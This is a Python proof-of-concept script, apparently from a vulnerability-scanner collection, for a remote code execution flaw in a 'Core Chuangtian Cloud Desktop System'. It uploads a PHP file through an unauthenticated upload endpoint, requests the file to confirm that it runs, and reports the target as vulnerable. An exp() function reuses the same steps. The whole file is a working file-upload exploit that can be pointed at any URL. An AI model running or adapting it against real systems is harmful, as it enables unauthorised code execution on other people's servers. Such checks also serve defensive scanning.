import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Core Chuangtian Cloud Desktop System RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/Upload/upload_file.php?l=test"""
        method = "POST"
        data = """------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/avif

<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--"""
        headers = {'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 'think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/Upload/test/test.php"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and "PHP Version" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url